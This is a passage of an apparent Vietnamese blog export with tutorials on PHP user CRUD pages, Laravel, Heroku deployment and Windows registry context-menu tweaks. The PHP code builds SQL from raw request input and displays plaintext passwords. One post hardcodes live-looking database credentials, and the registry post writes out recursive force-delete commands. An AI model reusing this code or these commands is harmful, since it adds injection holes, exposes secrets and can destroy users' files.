            </tr>
        </thead>
        <tbody>
            <?php
            require_once("../../model/connection.php");
            $sql = "SELECT * FROM users";
            $result = $conn->query($sql);
            if ($result->num_rows > 0) {
                while ($user = $result->fetch_assoc()) {
            ?>
                    <tr>
                        <th><?php echo $user["userID"] ?></th>
                        <td><?php echo $user["username"] ?></td>
                        <td><?php echo $user["password"] ?></td>
                        <td><?php echo $user["email"] ?></td>
                        <td><?php echo $user["phone"] ?></td>
                        <td><?php echo $user["address"] ?></td>
                        <td><?php echo $user["permission"] ?></td>
                        <td>
                            <a href="user_edit.php?id=<?php echo $user["userID"] ?>">Sửa</a>
                            <a href="user_delete.php?id=<?php echo $user["userID"] ?>">Xóa</a>
                        </td>
                    </tr>
            <?php
                }
            }
            ?>
        </tbody>
    </table>
    <a href="user_add.php"><button>Add User</button></a>

</body>

</html>
</pre>

<h2>3. Thêm User</h2>
-- Tạo file: view/admin/user_add.php
<pre>
<!DOCTYPE html>
<html>

<head>
    <title>Add User</title>
</head>

<body>
    <?php
    require_once("../../model/connection.php");
    if (isset($_POST["save"])) {
        $username = $_POST["username"];
        $password = $_POST["password"];
        $email = $_POST["email"];
        $phone = $_POST["phone"];
        $address = $_POST["address"];
        $permission = $_POST["permission"];
        $sql = "INSERT INTO users (username,password,email,phone,address,permission) 
                VALUES ('$username','$password','$email','$phone','$address','$permission')";
        if ($conn->query($sql) === TRUE) {
            header('Location: user_list.php');
        } else {
            echo "Error updating record: " . $conn->error;
        }
    }
    $conn->close();
    ?>

    <form method="POST">
        <label for="username">Username:</label><br>
        <input type="text" name="username"><br>

        <label for="password">Password:</label><br>
        <input type="password" name="password"><br>

        <label for="email">Email:</label><br>
        <input type="text" name="email"><br>

        <label for="phone">Phone:</label><br>
        <input type="text" name="phone"><br>

        <label for="address">Address:</label><br>
        <input type="text" name="address"><br>

        <label for="permission">Permission:</label><br>
        <select name="permission" required>
            <option selected disabled hidden>Please select permission</option>
            <option value="1">Administrator</option>
            <option value="2">Free User</option>
            <option value="3">Basic User</option>
            <option value="4">VIP User</option>
        </select><br>

        <input type="submit" name="save" value="Submit" ><br>
    </form>

</body>

</html>
</pre>

<h2>4. Sửa User</h1>
-- Tạo file: view/admin/user_edit.php
<pre>
<!DOCTYPE html>
<html>

<head>
    <title>Edit User</title>
</head>

<body>
    <?php
    require_once("../../model/connection.php");
    $id = "";
    $username = "";
    $password = "";
    $email = "";
    $phone = "";
    $address = "";
    $permission = "";
    if (isset($_GET["id"])) {
        $id = $_GET["id"];
        $sql = "SELECT * FROM users WHERE userID = $id";
        $result = $conn->query($sql);
        if ($result->num_rows > 0) {
            while ($user = $result->fetch_assoc()) {
                $id = $user["userID"];
                $username =  $user["username"];
                $password =  $user["password"];
                $email =  $user["email"];
                $phone = $user["phone"];
                $address = $user["address"];
                $permission = $user["permission"];
            }
        }
    }
    if (isset($_POST["save"])) {
        $username = $_POST["username"];
        $password = $_POST["password"];
        $email = $_POST["email"];
        $phone = $_POST["phone"];
        $address = $_POST["address"];
        $permission = $_POST["permission"];
        $sql = "UPDATE users 
                SET username='$username',password='$password',email='$email',
                    phone='$phone',address='$address',permission='$permission' 
                WHERE userID='$id'";
        if ($conn->query($sql) === TRUE) {
            header('Location: user_list.php');
        } else {
            echo "Error updating record: " . $conn->error;
        }
    }
    $conn->close();
    ?>
    <form method="POST">
        <label for="username">Username:</label><br>
        <input type="text" name="username" value="<?php echo $username; ?>"><br>

        <label for="password">Password:</label><br>
        <input type="password" name="password" value="<?php echo $password; ?>"><br>

        <label for="email">Email:</label><br>
        <input type="text" name="email" value="<?php echo $email; ?>"><br>

        <label for="phone">Phone:</label><br>
        <input type="text" name="phone" value="<?php echo $phone; ?>"><br>

        <label for="address">Address:</label><br>
        <input type="text" name="address" value="<?php echo $address; ?>"><br>

        <label for="permission">Permission:</label><br>
        <select name="permission" required>
            <option selected disabled hidden>Please select permission</option>
            <option value="1" <?php echo ($permission == 1) ? "selected" : ""; ?>>Administrator</option>
            <option value="2" <?php echo ($permission == 2) ? "selected" : ""; ?>>Free User</option>
            <option value="3" <?php echo ($permission == 3) ? "selected" : ""; ?>>Basic User</option>
            <option value="4" <?php echo ($permission == 4) ? "selected" : ""; ?>>VIP User</option>
        </select><br>
        <input type="submit" value="Submit" name="save"><br>
    </form>

</body>

</html>
</pre>

<h2>5. Xóa User</h2>
-- Tạo file: view/admin/user_delete.php
<pre>
<?php
require_once("../../model/connection.php");
if (isset($_GET["id"])) {
    $id = $_GET["id"];
    $sql = "DELETE FROM users WHERE userID = $id";
    if ($conn->query($sql) === TRUE) {
        header('Location: user_list.php');
    } else {
        echo "Error: " . $conn->error;
    }
}
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>200</wp:post_id>
		<wp:post_date><![CDATA[2020-03-08 06:28:44]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-03-08 06:28:44]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-03-08 06:28:44]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-03-08 06:28:44]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[php-hien-thi-danh-sach-user-them-sua-xoa-user-bang-php]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
						</item>
					<item>
		<title><![CDATA[Laravel - Mô hình MVC]]></title>
		<link>https://duycode.com/2020/03/08/laravel-mo-hinh-mvc/</link>
		<pubDate>Sun, 08 Mar 2020 07:40:54 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=205</guid>
		<description></description>
		<content:encoded><![CDATA[<img src="https://i.stack.imgur.com/4qglC.png" alt="MVC" />
<h2>1. Route</h2>
<pre>
<?php
// Sửa trong file Routes/web.php
// Cấu trúc Route::METHOD(path_string,HANDLE_FUNCTION);
// Giả sử Link vào trang -- http://localhost/t1904a_laravel/public/xin-chao -- như sau

Route::get("/xin-chao",function(){
    echo "Chào tất cả mọi người";
});

// Thực tế việc của Route là điều hướng đến Controller
// Ở dưới thể hiện điều hướng đến Controller, cụ thể là hàm "classRoom" trong WebController tại thư mục app/Http/Controller
Route::get("/danh-sach-lop-hoc","WebController@classRoom");

// Ở dưới thể hiện điều hướng đến Controller, cụ thể là hàm "listing" trong WebController tại thư mục app/Http/Controller, và có nhận thêm biến {id} ở listing.
Route::get("/danh-muc/{id}","WebController@listing");
//
</pre>

<h2>2. Controller</h2>
- Tạo file WebController trong thư mục app/Http/Controller bằng Terminal
<pre>php artisan make:controller WebController</pre>

- Thêm dữ liệu cho Controller
<pre>
<?php
namespace App\Http\Controllers;
use Illuminate\Http\Request;

class WebController extends Controller
{
    //tạo dữ liệu để thử
    public function classRoom(){
        $students = [
            [
                "id" => 1,
                "name"=> "Nguyễn Thị Ninh",
                "email"=> "ninhntth@gmail.com",
                "mark"=>9
            ],
            [
                "id" => 2,
                "name"=> "Nguyễn Thế Anh",
                "email"=> "theanh@gmail.com",
                "mark"=>3
            ],
            [
                "id" => 3,
                "name"=> "Nguyễn Thị Nụ",
                "email"=> "nuhongmmongmanh@gmail.com",
                "mark"=>7
            ],
        ];
        return view("student_listing",['students'=>$students]);
        // Ở trên thể hiện điều hướng đến resoures/views/student_listing.blade.php
        // Và bắn thêm biến students sang bên đó
    }

    //lấy thêm biến $id
    public function listing($id){
        $products = Product::where("category_id",$id)->take(20)->orderBy('created_at','desc')->get();
        return view("listing",['products'=>$products]);
}
</pre>

<h2>3. View</h2>
- Tại resoures/views/... tạo 1 file student_listing.blade.php với nội dung như sau
<pre>

<!doctype html>
<html lang="en">
<head>
    <link rel="stylesheet" href={{asset("css/style.css")}}>
</head>

<header>
    <ul class="nav nav-tabs">
        <li class="nav-item"><a class="nav-link active" href="{{url("/")}}">Home</a></li>
        @foreach(\App\Category::all() as $c)
            <li class="nav-item"><a class="nav-link" href="{{url("danh-muc/{$c->id}")}}">{{$c->category_name}}</a></li>
        @endforeach
    </ul>
</header>

<body>
<main>
<h1>Danh sách sinh viên</h1>

<table class="table">
    <thead>
        <th>ID</th>
        <th>Name</th>
        <th>Email</th>
        <th>Mark</th>
    </thead>
    <tbody>
            <?php foreach ($students as $s):?>
            <tr>
                <td><?php echo $s['id'];?></td>
                <td><?php echo $s['name'];?></td>
                <td><?php echo $s['email'];?></td>
                <td><?php echo $s['mark'];?></td>
            </tr>
            <?php endforeach; ?>
    </tbody>
</table>
</main>
</body>
</html>

//Bây giờ có thể vào http://localhost/t1904a_laravel/public/danh-sach-lop-hoc để xem kết quả
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>205</wp:post_id>
		<wp:post_date><![CDATA[2020-03-08 07:40:54]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-03-08 07:40:54]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-03-08 07:40:54]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-03-08 07:40:54]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[laravel-mo-hinh-mvc]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="laravel"><![CDATA[Laravel]]></category>
						</item>
					<item>
		<title><![CDATA[Laravel - Blade Template]]></title>
		<link>https://duycode.com/2020/03/08/laravel-blade-template/</link>
		<pubDate>Sun, 08 Mar 2020 09:34:04 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=213</guid>
		<description></description>
		<content:encoded><![CDATA[<img src="https://1.bp.blogspot.com/-mXa5WEt9uB4/WzPHV7c5bZI/AAAAAAAAEr0/1UekiyCF2JQU46vPMhfiaAUFeb2ib3yXACLcBGAs/s1600/BladeTemplates.png" alt="Blade template" />

- Tại resoures/views/... có 1 file layout.blade.php với nội dung như sau
<pre>

<!doctype html>
<html lang="en">
<head>
    <title>Test Layout</title>
</head>
<body>
<header>Rất nhiều code của Header ở đây</header>
<main>
    <div>
        @yield('content')
    </div>
</main>
<footer>Rất nhiều code của Footer ở đây</footer>
</body>
</html>
</pre>


- Vẫn tại resoures/views/...Các trang khác như /danh-muc, /san-pham, /don-hang muốn thừa kế phần trên mà ko phải viết lại code đoạn header, footer
<pre>
@extends('layout')

@section('content')
    <h1>Đây là phần viết thêm code</h1>
@endsection
</pre>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>213</wp:post_id>
		<wp:post_date><![CDATA[2020-03-08 09:34:04]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-03-08 09:34:04]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-03-08 09:34:04]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-03-08 09:34:04]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[laravel-blade-template]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="laravel"><![CDATA[Laravel]]></category>
						</item>
					<item>
		<title><![CDATA[Laravel - Lưu trữ Project với Github, Heroku, PostgreSQL]]></title>
		<link>https://duycode.com/2020/03/08/laravel-luu-tru-project-voi-github-heroku-postgresql/</link>
		<pubDate>Sun, 08 Mar 2020 10:54:27 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=215</guid>
		<description></description>
		<content:encoded><![CDATA[<img src="https://miro.medium.com/max/1200/1*kg8aAUNxI055OhNhT04srQ.png" alt="Heroku" />
<h2>1. Github</h2>
- Tạo Project trên Github như bình thường

<h2>2. Heroku</h2>
- Connect Heroku và Github
- Login Github trên Heroku và để Automatic deploys
- Tại Project, tạo 1 file: Procfile (ko có đuôi mở rộng) ở thư mục gốc với nội dung
<pre>web: vendor/bin/heroku-php-apache2 public/</pre>
- Tại .gitignore -> bỏ dòng ".env"
- Deploys lần đầu tại Heroku và xem kết quả :D

<h2>3. PostgreSQL</h2>
- Trên Heroku -> Data -> install PostgreSQL
- Lấy thông tin Host, Port, Username, Password trong mục Setting của PostgreSQL
- Vào /config/database.php: sửa phần  'pgsql' tương tự như sau:
<pre>
//khu vực sửa default
'default' => 'pgsql', // env('DB_CONNECTION', 'mysql'),

//khu vực sửa pgsql
'pgsql' => [
    'driver' => 'pgsql',
    //'url' => env('DATABASE_URL'),
    'host' => "ec2-3-234-169-147.compute-1.amazonaws.com",  //env('DB_HOST', '127.0.0.1'),
    'port' => 5432, //env('DB_PORT', '5432'),
    'database' => "dap7l49crge5kq",   //env('DB_DATABASE', 'forge'),
    'username' => "vqizhousadiyop",   // env('DB_USERNAME', 'forge'),
    'password' => "4859eae57eeceb42b2fe942471234934e004855aa74c00cf77317068223524b2",   //env('DB_PASSWORD', ''),
    'charset' => 'utf8',
    'prefix' => '',
    'prefix_indexes' => true,
    'schema' => 'public',
    'sslmode' => 'prefer',
],
</pre>

- Trên Heroku -> Console
<pre>
php artisan migrate
</pre>

- Khi đảo Database quá nhiều, rất dễ tình trạng bị mất kết nối, để chỉnh lại
<pre>
php artisan config:cache
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>215</wp:post_id>
		<wp:post_date><![CDATA[2020-03-08 10:54:27]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-03-08 10:54:27]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-03-08 10:54:27]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-03-08 10:54:27]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[laravel-luu-tru-project-voi-github-heroku-postgresql]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="laravel"><![CDATA[Laravel]]></category>
						</item>
					<item>
		<title><![CDATA[Laravel - Database - Phần 1]]></title>
		<link>https://duycode.com/2020/03/08/laravel-database-phan-1/</link>
		<pubDate>Sun, 08 Mar 2020 12:41:53 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=219</guid>
		<description></description>
		<content:encoded><![CDATA[<img src="https://laraveldaily.com/wp-content/uploads/2017/10/Screen-Shot-2017-10-16-at-7.31.52-AM-1024x543.png" alt="database" />
<h2>I. Kết nối Database</h2>
<h3>1. Tạo Database trên XAMPP</h3>
- chỉ tạo database chứ không tạo bảng hay cột gì hết
<h3>2. Kết nối Laravel với Database</h3>
- Sửa file /.env như sau:
<pre>
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=demolaravel  //tên database vừa tạo bên trên
DB_USERNAME=root
DB_PASSWORD=
</pre>

<h2>II. Tạo các bảng, cột thông qua Migrate</h2>

<h3>1. Tạo bảng bằng Migrate</h3>
- Tạo 3 bảng Database: Category, Brand, Product bằng Terminal
<pre>
php artisan make:migration create_category --create=category
php artisan make:migration create_brand --create=brand
php artisan make:migration create_product --create=product
//create_category: là tạo class CreateCategory
//create=category: là tạo bảng tên category
</pre>

- Vào database/migrations/... thấy có 3 bảng vừa tạo

<h3>2. Tạo cột với mỗi bảng</h3>
- Với bảng Product ta có thể tạo như sau (2 bảng còn lại tương tự)
<pre>
<?php

use Illuminate\Support\Facades\Schema;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Database\Migrations\Migration;

class CreateProduct extends Migration
{
    public function up()
    {
        Schema::create('product', function (Blueprint $table) {
            $table->bigIncrements('id'); //PK + unsigned big interger + auto increment
            $table->string('product_name',191)->unique(); //varchar(191)
            $table->string('product_desc')->nullable(); //varchar(255)
            $table->string('thumbnail')->nullable();
            $table->string('gallery')->nullable();
            $table->unsignedBigInteger('category_id');
            $table->unsignedBigInteger('brand_id');
            $table->decimal('price',12,4);  // tiền $ là 12,4. VNĐ là 16,0
            $table->unsignedInteger('quantity')->default(1);
            $table->timestamps(); //tạo 1 lúc 2 columns: created_ad update_ad

            //khóa ngoài
            $table->foreign('category_id')->references('id')->on('category');
            $table->foreign('brand_id')->references('id')->on('brand');
        });
    }

    public function down()
    {
        Schema::dropIfExists('product');
    }
}
</pre>

<h3>3. Khởi chạy Migrate</h3>
- Dùng terminal
<pre>
php artisan migrate
</pre>
- Quay lại database, thấy 3 bảng đã được tạo với các cột như trên

]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>219</wp:post_id>
		<wp:post_date><![CDATA[2020-03-08 12:41:53]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-03-08 12:41:53]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-03-08 12:41:53]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-03-08 12:41:53]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[laravel-database-phan-1]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="laravel"><![CDATA[Laravel]]></category>
						</item>
					<item>
		<title><![CDATA[Laravel – Database - Phần 2]]></title>
		<link>https://duycode.com/2020/03/08/laravel-database-phan-2/</link>
		<pubDate>Sun, 08 Mar 2020 14:12:41 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=232</guid>
		<description></description>
		<content:encoded><![CDATA[<img src="https://laraveldaily.com/wp-content/uploads/2017/10/Screen-Shot-2017-10-16-at-7.31.52-AM-1024x543.png" alt="database" />
<h2>III. Tạo model</h2>
<h3>1. Tạo file model</h3>
- Dùng terminal, chạy từng lệnh sau:
<pre>
php artisan make:model Category
php artisan make:model Brand
php artisan make:model Product
</pre>
- Vào trong app/.. đã thấy có 3 file php tương ứng

<h3>2. Định nghĩa từng Model</h3>
- Giả sử với file Product.php trong app/..
<pre>
<?php
namespace App;
use Illuminate\Database\Eloquent\Model;

class Product extends Model
{
    protected $table = 'product';

    protected $fillable = ['product_name','product_desc','thumbnail',
        'gallery','category_id','brand_id','price','quantity'];
}
</pre>

<h3>3. Định nghĩa factory</h3>
- Vào /database/factories/UserFactory.php, thêm vào cuối như sau:
<pre>
$factory->define(\App\Brand::class,function (Faker $faker){
    return [
        'product_name' => $faker -> unique() ->name,
        'product_desc' => $faker -> title,
        'thumbnail' => $faker -> imageUrl(),
        'gallery' => $faker -> imageUrl().",". $faker -> imageUrl(),
        'price' => random_int(1,1000),
        'quantity' => random_int(1,100),
        'category_id' => random_int(1,100),
        'brand_id' => random_int(1,100),
    ];
});
//ở trên nghĩa là lấy dữ liệu giả mạo (faker), lấy các tên "name" để làm tên cho 'product_name'
</pre>

<h3>4. Định nghĩa seeds</h3>
- Tạo file CategorySeeder.php trong seeds bằng terminal
<pre>
php artisan make:seeder CategorySeeder
</pre> 

- Định nghĩa file /database/seeds/CategorySeeder.php
<pre>
<?php

use Illuminate\Database\Seeder;

class CategorySeeder extends Seeder
{
    public function run()
    {
        // factory(\App\Category::class,100)->create();
        // factory(\App\Brand::class,100)->create();
        factory(\App\Product::class,1000)->create();
        // chạy dòng nào thì database sẽ add số lượng tương ứng với bảng đó, có thể chạy cả 3 cùng lúc
    }
}
</pre>

- Định nghĩa file /database/seeds/DatabaseSeeder.php
<pre>
<?php

use Illuminate\Database\Seeder;

class DatabaseSeeder extends Seeder
{
    public function run()
    {
        $this->call(CategorySeeder::class);
    }
}
</pre>

<h3>5. Khởi chạy seeds</h3>
- Dùng terminal
<pre>
php artisan db:seed
</pre>

- Khi đã tạo nhiều dữ liệu fake rồi, muốn refresh lại seed lại thì dùng lệnh sau:
<pre>
php artisan migrate:refresh --seed
</pre>
- Quay lại database, trong bảng Category, đã tạo ra được 100 dữ liệu fake :D]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>232</wp:post_id>
		<wp:post_date><![CDATA[2020-03-08 14:12:41]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-03-08 14:12:41]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-03-08 14:12:41]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-03-08 14:12:41]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[laravel-database-phan-2]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="laravel"><![CDATA[Laravel]]></category>
						</item>
					<item>
		<title><![CDATA[Registry Editor in Windows 10]]></title>
		<link>https://duycode.com/2020/03/28/registry-editor-in-windows-10/</link>
		<pubDate>Sat, 28 Mar 2020 07:52:04 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=254</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Thêm "Open in Windows Terminal" vào để mở file .bat</h2>
- Tạo file abc.bat với nội dung như sau
<pre>
REG ADD HKEY_CLASSES_ROOT\batfile\shell\terminal /d "Open in Windows Terminal" -f
REG ADD HKEY_CLASSES_ROOT\batfile\shell\terminal /v "Icon" /d "%SystemRoot%\System32\cmd.exe" -f
REG ADD HKEY_CLASSES_ROOT\batfile\shell\terminal\command /d "wt new-tab cmd.exe /C \"%%1\" %%*" -f
</pre>
- Run với quyền admin

<h2>1. Thêm CMD vào chuột Phải</h2>
<h3>1.1. Cách 1: Dùng bằng file duycode.reg </h3>
a. Tạo file duycode.reg và click đúp để chạy, nội dung file như sau
<pre>
Windows Registry Editor Version 5.00

[HKEY_CLASSES_ROOT\Directory\Background\shell\Duy.CMD]
 @="Open CMD Here"
"Icon"="%SystemRoot%\\System32\\cmd.exe"

[HKEY_CLASSES_ROOT\Directory\Background\shell\Duy.CMD\command]
 @="cmd.exe /s /k pushd \"%V\""

[HKEY_CLASSES_ROOT\Directory\shell\Duy.CMD]
 @="Open CMD Here"
"Icon"="%SystemRoot%\\System32\\cmd.exe"

[HKEY_CLASSES_ROOT\Directory\shell\Duy.CMD\command]
 @="cmd.exe /s /k pushd \"%V\""
</pre>

b. Xóa MenuContext: Duy.CMD
<pre>
Windows Registry Editor Version 5.00

[-HKEY_CLASSES_ROOT\Directory\Background\shell\Duy.CMD]
[-HKEY_CLASSES_ROOT\Directory\shell\Duy.CMD]
</pre>

<h3>1.2. Cách 2: Dùng bằng file duycode.bat</h2>
-- Xem hướng dẫn sử dụng REG bằng cmd bằng câu lệnh: "REG /?"
-- Tạo file duycode.bat, khi khởi chạy nhớ "Run as administrator"
-- Nội dung như sau
<pre>
REG ADD HKEY_CLASSES_ROOT\Directory\shell\Duy.CMD /d "Open CMD Here"
REG ADD HKEY_CLASSES_ROOT\Directory\shell\Duy.CMD /v "Icon" /d "%SystemRoot%\System32\shell32.dll,2"
REG ADD HKEY_CLASSES_ROOT\Directory\shell\Duy.CMD\command /d "cmd.exe /s /k pushd \"%%V\""

REG ADD HKEY_CLASSES_ROOT\Directory\Background\shell\Duy.CMD /d "Open CMD Here"
REG ADD HKEY_CLASSES_ROOT\Directory\Background\shell\Duy.CMD /v "Icon" /d "%SystemRoot%\System32\shell32.dll,2"
REG ADD HKEY_CLASSES_ROOT\Directory\Background\shell\Duy.CMD\command /d "cmd.exe /s /k pushd \"%%V\""
</pre>
-- Xóa key như sau
<pre>
REG DELETE HKEY_CLASSES_ROOT\Directory\shell\Duy.CMD /f
REG DELETE HKEY_CLASSES_ROOT\Directory\Background\shell\Duy.CMD /f
</pre>

<h2>2. Fastest Copy và Fastest Delete</h2>
<h3>Cách 1: Sử dụng file duycode.reg</h3>
<pre>
Windows Registry Editor Version 5.00

[HKEY_CLASSES_ROOT\Directory\shell\Duy.FastestDelete]
@="Fastest Delete Folder"
[HKEY_CLASSES_ROOT\Directory\shell\Duy.FastestDelete\Command]
@="cmd.exe /c \"pause && del /s/q/f \"%1\" > nul && rmdir /q/s \"%1\"\""

[HKEY_CLASSES_ROOT\Directory\shell\Duy.FastestCopy]
@="Fastest Copy Folder"
[HKEY_CLASSES_ROOT\Directory\shell\Duy.FastestCopy\Command]
@="cmd.exe /k \"robocopy \"%1\" \"%1-%%random%%\" /e\""
</pre>
-- Xóa MenuContext: Duy.FastestDelete</h3>
<pre>
Windows Registry Editor Version 5.00

[-HKEY_CLASSES_ROOT\Directory\shell\Duy.FastestDelete]
[-HKEY_CLASSES_ROOT\Directory\shell\Duy.FastestCopy]
</pre>

<h3>Bolus :D Cách 2: Sử dụng file duycode.bat</h3>
<pre>
REG ADD HKEY_CLASSES_ROOT\Directory\shell\Duy.FastestDelete /d "Fastest Delete Folder" /f
REG ADD HKEY_CLASSES_ROOT\Directory\shell\Duy.FastestDelete\command /d "cmd.exe /c \"pause ^&^& del /s/q/f \"%%1\" ^> nul ^&^& rmdir /q/s \"%%1\"\"" /f
</pre>
-- Xóa menuContext như sau
<blockquote>
REG DELETE HKEY_CLASSES_ROOT\Directory\shell\Duy.FastestDelete /f
</blockquote>


<h2>*** Một số cú pháp tham khảo khác</h2>
<pre>
@="cmd.exe /c move \"%1\\*.*\" . && rd \"%1\""       => đưa tất cả file con ra file mẹ và xóa thư mục mẹ nếu trống
@="cmd.exe /c del /q \"%1\""                         => chỉ xóa file trong thư mục root đã chọn, các file trong thư mục lv 2 trở lên không xóa
@="cmd.exe /c del /q \"%1\\*.*\""                    => cũng chỉ xóa file trong thư mục root đã chọn, các file trong thư mục lv 2 trở lên không xóa

@="cmd.exe /c del /f/q/s \"*.*\" > nul"              => xóa tất cả các file chỗ đang làm việc (cái thư mục bị trỏ chuột và thư mục ngoài đều dính, do không dùng lệnh %1
@="cmd.exe /c del /f/q/s \"%1\\*.*\" > nul"          => xóa tất cả file, mọi cấp thuộc thư mục đó

@="cmd.exe /c rmdir /s /q \"%1\""                    => xóa luôn thư mục vừa chọn



@="cmd.exe /c \"pause && cd \"%1\" && DEL /F/Q/S \"%1\" > NUL && RMDIR /Q/S \"%1\"\"" => Ngon => Ngon, làm trống thư mục nhanh nhất

@="cmd.exe /c \"pause && del /s/q/f \"%1\" > nul && rmdir /q/s \"%1\"\""  => Ngon => Ngon => Xóa cả thư mục nhanh nhất luôn

Lệnh CMD
DEL /F/Q/S *.* > NUL       => Xóa tất cả file thuộc thư mục đang làm việc   (/S => xóa cả đường dẫn con)                     
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>254</wp:post_id>
		<wp:post_date><![CDATA[2020-03-28 07:52:04]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-03-28 07:52:04]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-03-31 09:31:07]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-03-31 09:31:07]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[registry-editor-in-windows-10]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="windows"><![CDATA[Windows]]></category>
						</item>
					<item>
		<title><![CDATA[JavaScript - Regex - Biểu thức chính quy]]></title>
		<link>https://duycode.com/2020/05/09/javascript-regex-bieu-thuc-chinh-quy/</link>
		<pubDate>Sat, 09 May 2020 21:01:56 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=280</guid>
